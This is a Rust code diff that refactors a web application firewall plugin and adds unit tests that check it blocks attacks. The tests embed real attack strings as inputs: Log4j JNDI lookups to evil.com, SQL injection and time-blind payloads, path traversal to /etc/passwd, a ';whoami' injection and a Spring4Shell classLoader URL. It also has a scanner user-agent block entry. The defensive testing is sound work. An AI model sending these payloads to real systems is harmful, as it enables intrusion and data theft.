@@ -4,6 +4,7 @@
 //! and body streaming by inspecting request URI paths, query parameters, User-Agents,
 //! and headers against known attack signatures in single-digit nanoseconds.
 
+use std::collections::HashSet;
 use std::str::FromStr;
 
 use http::StatusCode;
@@ -11,10 +12,15 @@ use http::header::{HeaderName, HeaderValue};
 use velda_core::{Action, L7Request, L7Response};
 use velda_sync::post_sync::plugin::PluginConfig;
 
-use super::scanner::{ThreatVector, WafMatcher, with_normalized};
+use super::dictionary::ThreatVector;
+use super::scanner::WafMatcher;
 use crate::capability::{AccessLevel, PluginCapability, SupportedProtocols};
 use crate::error::PluginError;
 use crate::pre_route::PreRoutePlugin;
+
+const X_WAF_THREAT_DETECTED: HeaderName = HeaderName::from_static("x-waf-threat-detected");
+const X_WAF_THREAT_TYPE: HeaderName = HeaderName::from_static("x-waf-threat-type");
+const HEADER_TRUE: HeaderValue = HeaderValue::from_static("true");
 
 /// Operational mode of the WAF Lite inspection engine.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
@@ -67,14 +73,15 @@ pub struct WafLitePlugin {
 }
 
 impl WafLitePlugin {
-    /// Constructs a new `WafLitePlugin` from raw configuration parameters.
-    pub fn new(
+    /// Attempts to construct a new `WafLitePlugin` from raw configuration parameters.
+    /// Automatically normalizes and deduplicates custom patterns and user-agents against built-in dictionary.
+    pub fn try_new(
         id: impl Into<String>,
         mode: WafMode,
         scope: WafScope,
         custom_blocked_patterns: Vec<String>,
         custom_blocked_user_agents: Vec<String>,
-    ) -> Self {
+    ) -> Result<Self, PluginError> {
         let forbidden_response = L7Response::from_bytes(
             StatusCode::FORBIDDEN,
             "{\"error\":\"Forbidden: Malicious payload detected\"}",
@@ -84,30 +91,59 @@ impl WafLitePlugin {
             HeaderValue::from_static("application/json"),
         );
 
-        let custom_patterns_lower: Vec<String> = custom_blocked_patterns
-            .into_iter()
-            .map(|p| p.trim().to_ascii_lowercase())
-            .filter(|p| !p.is_empty())
-            .collect();
+        let mut seen_pats = HashSet::with_capacity(custom_blocked_patterns.len());
+        let mut deduped_patterns = Vec::with_capacity(custom_blocked_patterns.len());
+        for p in custom_blocked_patterns {
+            let lower = p.trim().to_ascii_lowercase();
+            if !lower.is_empty()
+                && !velda_sync::is_builtin_attack_pattern(&lower)
+                && seen_pats.insert(lower.clone())
+            {
+                deduped_patterns.push(lower);
+            }
+        }
 
-        let custom_ua_lower: Vec<String> = custom_blocked_user_agents
-            .into_iter()
-            .map(|ua| ua.trim().to_ascii_lowercase())
-            .filter(|ua| !ua.is_empty())
-            .collect();
+        let mut seen_uas = HashSet::with_capacity(custom_blocked_user_agents.len());
+        let mut deduped_uas = Vec::with_capacity(custom_blocked_user_agents.len());
+        for ua in custom_blocked_user_agents {
+            let lower = ua.trim().to_ascii_lowercase();
+            if !lower.is_empty()
+                && !velda_sync::is_builtin_user_agent(&lower)
+                && seen_uas.insert(lower.clone())
+            {
+                deduped_uas.push(lower);
+            }
+        }
 
-        let matcher = WafMatcher::new(&custom_patterns_lower, &custom_ua_lower)
-            .expect("Failed to initialize WafMatcher");
+        let matcher = WafMatcher::new(&deduped_patterns, &deduped_uas)?;
 
-        Self {
+        Ok(Self {
             id: id.into(),
             mode,
             scope,
-            custom_blocked_patterns: custom_patterns_lower,
-            custom_blocked_user_agents: custom_ua_lower,
+            custom_blocked_patterns: deduped_patterns,
+            custom_blocked_user_agents: deduped_uas,
             matcher,
             forbidden_response,
-        }
+        })
+    }
+
+    /// Constructs a new `WafLitePlugin`, panicking if pattern compilation fails.
+    pub fn new(
+        id: impl Into<String>,
+        mode: WafMode,
+        scope: WafScope,
+        custom_blocked_patterns: Vec<String>,
+        custom_blocked_user_agents: Vec<String>,
+    ) -> Self {
+        Self::try_new(
+            id,
+            mode,
+            scope,
+            custom_blocked_patterns,
+            custom_blocked_user_agents,
+        )
+        .expect("Failed to initialize WafLitePlugin")
     }
 
     /// Deserializes and constructs an instance directly from a [`PluginConfig`].
@@ -120,7 +156,7 @@ impl WafLitePlugin {
                 ))
             })?;
 
-        let mode = match cfg.mode.to_ascii_lowercase().as_str() {
+        let mode = match cfg.mode.as_str() {
             "block" => WafMode::Block,
             "detect" => WafMode::DetectOnly,
             other => {
@@ -149,13 +185,13 @@ impl WafLitePlugin {
             check_headers,
         };
 
-        Ok(Self::new(
+        Self::try_new(
             &config.id,
             mode,
             scope,
             cfg.custom_blocked_patterns,
             cfg.custom_blocked_user_agents,
-        ))
+        )
     }
 
     #[inline]
@@ -163,11 +199,9 @@ impl WafLitePlugin {
         match self.mode {
             WafMode::Block => Action::Respond(self.forbidden_response.clone()),
             WafMode::DetectOnly => {
+                req.headers.insert(X_WAF_THREAT_DETECTED, HEADER_TRUE);
                 req.headers
-                    .insert("x-waf-threat-detected", HeaderValue::from_static("true"));
-                if let Ok(val) = HeaderValue::from_str(vector.as_str()) {
-                    req.headers.insert("x-waf-threat-type", val);
-                }
+                    .insert(X_WAF_THREAT_TYPE, vector.as_header_value());
                 Action::Continue
             }
         }
@@ -181,43 +215,36 @@ impl PreRoutePlugin for WafLitePlugin {
     }
 
     fn on_request(&self, req: &mut L7Request) -> Action {
-        // 1. Inspect URI Path (zero-allocation + SIMD Aho-Corasick)
-        if self.scope.check_path {
-            let path = req.uri.path();
-            let threat = with_normalized(path, |norm| self.matcher.check_patterns(norm));
-            if let Some((_, vector)) = threat {
-                return self.handle_threat(req, vector);
-            }
+        // 1. Inspect URI Path (zero-allocation + SIMD Aho-Corasick on raw bytes)
+        if self.scope.check_path
+            && let Some(vector) = self
+                .matcher
+                .check_patterns(req.uri.path().as_bytes(), false)
+        {
+            return self.handle_threat(req, vector);
         }
 
-        // 2. Inspect Query String (zero-allocation + SIMD Aho-Corasick)
+        // 2. Inspect Query String (zero-allocation + form-urlencoded '+' to space + SIMD Aho-Corasick)
         if self.scope.check_query
             && let Some(query) = req.uri.query()
+            && let Some(vector) = self.matcher.check_patterns(query.as_bytes(), true)
         {
-            let threat = with_normalized(query, |norm| self.matcher.check_patterns(norm));
-            if let Some((_, vector)) = threat {
-                return self.handle_threat(req, vector);
+            return self.handle_threat(req, vector);
+        }
+
+        // 3. Inspect User-Agent Header (scans all duplicate headers on raw byte slices)
+        if self.scope.check_user_agent {
+            for ua_val in req.headers.get_all(http::header::USER_AGENT) {
+                if self.matcher.check_user_agent(ua_val.as_bytes()) {
+                    return self.handle_threat(req, ThreatVector::MaliciousScanner);
+                }
             }
         }
 
-        // 3. Inspect User-Agent Header (zero-allocation + SIMD Aho-Corasick)
-        if self.scope.check_user_agent
-            && let Some(ua) = req.headers.get(http::header::USER_AGENT)
-            && let Ok(ua_str) = ua.to_str()
-        {
-            let matched = with_normalized(ua_str, |norm| self.matcher.check_user_agent(norm));
-            if matched.is_some() {
-                return self.handle_threat(req, ThreatVector::MaliciousScanner);
-            }
-        }
-
-        // 4. Inspect Custom Configured Headers (zero-allocation + SIMD Aho-Corasick)
+        // 4. Inspect Custom Configured Headers (scans all duplicate headers on raw byte slices)
         for hdr_name in &self.scope.check_headers {
-            if let Some(val) = req.headers.get(hdr_name)
-                && let Ok(s) = val.to_str()
-            {
-                let threat = with_normalized(s, |norm| self.matcher.check_patterns(norm));
-                if let Some((_, vector)) = threat {
+            for val in req.headers.get_all(hdr_name) {
+                if let Some(vector) = self.matcher.check_patterns(val.as_bytes(), false) {
                     return self.handle_threat(req, vector);
                 }
             }
@@ -286,7 +313,7 @@ mod tests {
     }
 
     #[test]
-    fn test_waf_blocks_sql_injection_in_query() {
+    fn test_waf_blocks_double_percent_encoded_path_traversal() {
         let plugin = WafLitePlugin::new(
             "waf_lite",
             WafMode::Block,
@@ -296,7 +323,29 @@ mod tests {
         );
 
         let mut req = build_test_request(
-            "/api/v1/items?id=1%27%20UNION%20SELECT%20*%20FROM%20users--",
+            "/api/v1/download?file=%252e%252e%252fboot.ini",
+            HeaderMap::new(),
+        );
+        let action = plugin.on_request(&mut req);
+
+        match action {
+            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
+            _ => panic!("Expected Action::Respond(403)"),
+        }
+    }
+
+    #[test]
+    fn test_waf_blocks_sql_injection_with_plus_and_comment() {
+        let plugin = WafLitePlugin::new(
+            "waf_lite",
+            WafMode::Block,
+            WafScope::default(),
+            vec![],
+            vec![],
+        );
+
+        let mut req = build_test_request(
+            "/api/v1/items?id=1%27+UNION/**/SELECT+*+FROM+users--",
             HeaderMap::new(),
         );
         let action = plugin.on_request(&mut req);
@@ -355,6 +404,56 @@ mod tests {
     }
 
     #[test]
+    fn test_waf_blocks_non_ascii_byte_evasion_in_header() {
+        let mut scope = WafScope::default();
+        scope
+            .check_headers
+            .push(HeaderName::from_static("x-forwarded-host"));
+        let plugin = WafLitePlugin::new("waf_lite", WafMode::Block, scope, vec![], vec![]);
+
+        let mut headers = HeaderMap::new();
+        headers.insert(
+            HeaderName::from_static("x-forwarded-host"),
+            HeaderValue::from_bytes(b"\x80${jndi:ldap://evil.com/poc}").unwrap(),
+        );
+
+        let mut req = build_test_request("/api/v1/auth", headers);
+        let action = plugin.on_request(&mut req);
+
+        match action {
+            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
+            _ => panic!("Expected Action::Respond(403) due to raw byte JNDI match"),
+        }
+    }
+
+    #[test]
+    fn test_waf_blocks_duplicate_header_smuggling() {
+        let mut scope = WafScope::default();
+        scope
+            .check_headers
+            .push(HeaderName::from_static("x-forwarded-host"));
+        let plugin = WafLitePlugin::new("waf_lite", WafMode::Block, scope, vec![], vec![]);
+
+        let mut headers = HeaderMap::new();
+        headers.append(
+            HeaderName::from_static("x-forwarded-host"),
+            HeaderValue::from_static("clean.example.com"),
+        );
+        headers.append(
+            HeaderName::from_static("x-forwarded-host"),
+            HeaderValue::from_static("attacker.com' or '1'='1"),
+        );
+
+        let mut req = build_test_request("/api/v1/auth", headers);
+        let action = plugin.on_request(&mut req);
+
+        match action {
+            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
+            _ => panic!("Expected Action::Respond(403) when scanning duplicate headers"),
+        }
+    }
+
+    #[test]
     fn test_waf_detect_only_mode_allows_request_and_injects_headers() {
         let plugin = WafLitePlugin::new(
             "waf_lite",
@@ -391,7 +490,10 @@ mod tests {
             "Mozilla/5.0 Chrome/120.0".parse().unwrap(),
         );
 
-        let mut req = build_test_request("/api/v1/orders/12345?format=json", headers);
+        let mut req = build_test_request(
+            "/api/v1/orders/12345?format=json&shipping=express&shop=1",
+            headers,
+        );
         let action = plugin.on_request(&mut req);
 
         assert!(matches!(action, Action::Continue));
@@ -409,8 +511,8 @@ mod tests {
                 "check_query": true,
                 "check_user_agent": true,
                 "check_headers": ["referer"],
-                "custom_blocked_patterns": ["${jndi:"],
-                "custom_blocked_user_agents": ["nmap-scanner"]
+                "custom_blocked_patterns": ["custom_secret_marker", "${jndi:"],
+                "custom_blocked_user_agents": ["custom-scanner", "sqlmap"]
             }),
         };
 
@@ -421,18 +523,30 @@ mod tests {
         assert!(
             plugin
                 .custom_blocked_patterns
+                .contains(&"custom_secret_marker".to_string())
+        );
+        assert!(
+            !plugin
+                .custom_blocked_patterns
                 .contains(&"${jndi:".to_string())
         );
         assert!(
             plugin
                 .custom_blocked_user_agents
-                .contains(&"nmap-scanner".to_string())
+                .contains(&"custom-scanner".to_string())
+        );
+        assert!(
+            !plugin
+                .custom_blocked_user_agents
+                .contains(&"sqlmap".to_string())
         );
 
         let mut headers = HeaderMap::new();
         headers.insert(
             "referer",
-            "http://attacker.com?payload=${jndi:ldap}".parse().unwrap(),
+            "http://attacker.com?payload=custom_secret_marker"
+                .parse()
+                .unwrap(),
         );
         let mut req = build_test_request("/api/login", headers);
 
@@ -440,12 +554,80 @@ mod tests {
         assert!(matches!(action, Action::Continue));
         assert_eq!(req.headers.get("x-waf-threat-detected").unwrap(), "true");
 
-        // Incomplete config must fail validation
         let bad_config = PluginConfig {
             id: "waf_lite".into(),
             phase: String::new(),
             config: json!({}),
         };
         assert!(WafLitePlugin::from_config(&bad_config).is_err());
+    }
+
+    #[test]
+    fn test_waf_blocks_nested_log4j_evasion() {
+        let mut scope = WafScope::default();
+        scope
+            .check_headers
+            .push(HeaderName::from_static("x-forwarded-for"));
+        let plugin = WafLitePlugin::new("waf_lite", WafMode::Block, scope, vec![], vec![]);
+
+        let mut headers = HeaderMap::new();
+        headers.insert(
+            HeaderName::from_static("x-forwarded-for"),
+            HeaderValue::from_static("${${lower:j}ndi:ldap://evil.com/poc}"),
+        );
+
+        let mut req = build_test_request("/api/v1/auth", headers);
+        let action = plugin.on_request(&mut req);
+
+        match action {
+            Action::Respond(resp) => assert_eq!(resp.status, StatusCode::FORBIDDEN),
+            _ => panic!("Expected Action::Respond(403) on nested Log4j evasion"),
+        }
+    }
+
+    #[test]
+    fn test_waf_blocks_parenthesis_sqli_and_time_blind() {
+        let plugin = WafLitePlugin::new(
+            "waf_lite",
+            WafMode::Block,
+            WafScope::default(),
+            vec![],
+            vec![],
+        );
+
+        let mut req1 = build_test_request(
+            "/api/v1/items?id=1%27UNION(SELECT%20password%20FROM%20users)",
+            HeaderMap::new(),
+        );
+        assert!(matches!(plugin.on_request(&mut req1), Action::Respond(_)));
+
+        let mut req2 = build_test_request(
+            "/api/v1/items?id=1%27%20AND%20SLEEP(5)--%20",
+            HeaderMap::new(),
+        );
+        assert!(matches!(plugin.on_request(&mut req2), Action::Respond(_)));
+    }
+
+    #[test]
+    fn test_waf_blocks_shell_rce_and_cves() {
+        let plugin = WafLitePlugin::new(
+            "waf_lite",
+            WafMode::Block,
+            WafScope::default(),
+            vec![],
+            vec![],
+        );
+
+        let mut req1 = build_test_request("/api/v1/users;whoami", HeaderMap::new());
+        assert!(matches!(plugin.on_request(&mut req1), Action::Respond(_)));
+
+        let mut req2 = build_test_request("/api/..;/..;/etc/passwd", HeaderMap::new());
+        assert!(matches!(plugin.on_request(&mut req2), Action::Respond(_)));
+
+        let mut req3 = build_test_request(
+            "/api/v1/user?class.module.classLoader.URLs%5B0%5D=jar:http://evil.com/x.war!/",
+            HeaderMap::new(),
+        );
+        assert!(matches!(plugin.on_request(&mut req3), Action::Respond(_)));
     }
 }
